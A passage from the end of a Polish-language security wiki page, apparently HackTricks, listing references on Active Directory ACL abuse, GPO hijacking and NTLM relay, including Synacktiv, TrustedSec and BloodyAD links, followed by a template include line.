- [6] [Skanowanie uprawnień Active Directory i kont uprzywilejowanych](https://adsecurity.org/?p=3658)
- [7] [Konstruktor ActiveDirectoryAccessRule - Microsoft Learn](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryaccessrule.-ctor?view=netframework-4.7.2#System_DirectoryServices_ActiveDirectoryAccessRule__ctor_System_Security_Principal_IdentityReference_System_DirectoryServices_ActiveDirectoryRights_System_Security_AccessControl_AccessControlType_)
- [8] [BloodyAD – operacje na atrybutach AD/UAC z systemu Linux](https://github.com/CravateRouge/bloodyAD)
- [9] [Samba – net rpc (członkostwo w grupach)](https://www.samba.org/)
- [10] [HTB Puppy: nadużywanie ACL w AD, łamanie Argon2 KeePassXC i deszyfrowanie DPAPI prowadzące do uprawnień administratora DC](https://0xdf.gitlab.io/2025/09/27/htb-puppy.html)
- [11] [TrustedSec - ARP Around and Find Out: przejmowanie ścieżek UNC GPO w celu wykonania kodu i przekazywania NTLM](https://trustedsec.com/blog/arp-around-and-find-out-hijacking-gpo-unc-paths-for-code-execution-and-ntlm-relay)
- [12] [GPOddity: wykorzystywanie GPO Active Directory za pomocą przekazywania NTLM i nie tylko](https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more)
- [13] [OU having a laugh? - Petros Koutroumpis](https://labs.withsecure.com/publications/ou-having-a-laugh)
- [14] [OUned.py: wykorzystywanie ukrytych wektorów ataku ACL jednostek organizacyjnych w Active Directory](https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory)
- [15] [Symulowanie legalnych usług Active Directory w sieci: przypadek wykorzystywania GPO](https://synacktiv.com/en/publications/simulating-legitimate-active-directory-services-on-the-network-the-case-of-gpo.html)
- [16] [Synacktiv GPOddity](https://github.com/synacktiv/GPOddity)
- [17] [Synacktiv OUned](https://github.com/synacktiv/OUned)
{{#include ../../../banners/hacktricks-training.md}}
